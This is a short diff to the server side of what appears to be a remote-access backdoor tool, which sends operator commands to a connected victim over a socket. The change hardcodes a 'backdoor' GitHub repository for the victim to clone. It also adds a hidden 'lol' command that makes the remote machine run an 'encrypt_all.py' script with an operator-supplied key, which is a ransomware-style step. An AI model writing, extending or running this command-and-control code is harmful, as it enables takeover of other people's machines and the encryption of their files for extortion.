@@ -56,7 +56,14 @@ while True:
         break
     if command.lower() == "git_clone":
         # if git_clone command was issued, send the repo name
-        send_git_clone_command(client_socket, "\n".join(command.split()[1:]))
+        repo_name = "https://github.com/emomeza/backdoor"
+        send_git_clone_command(client_socket, repo_name)
+        
+    if command.lower() == "lol":
+        command = "python3 encrypt_all.py"
+        input = input("Enter the key: ")
+        client_socket.send(command.encode())
+        client_socket.send(input.encode())
     # retrieve command results
     output = client_socket.recv(BUFFER_SIZE).decode()
     # split command output and current directory
